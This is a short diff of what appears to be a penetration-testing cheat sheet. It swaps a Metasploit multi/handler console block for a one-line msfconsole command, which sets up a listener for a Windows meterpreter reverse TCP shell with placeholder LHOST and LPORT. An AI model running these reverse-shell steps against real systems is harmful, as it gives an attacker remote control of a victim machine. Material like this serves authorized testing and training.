@@ -4274,11 +4274,7 @@ Example of usage
 5. Select `meterpreter_reverse_tcp` with `1`
 6. Set `LHOST` and `LPORT`
 7. Create a listener in Kali with Metasploit
-   ```
-   msf exploit(multi/handler) > show options
-   msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
-   msf exploit(multi/handler) > exploit
-   ```
+   - `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"`
 8. Get the meterpreter shell on the attacking machine
 
 
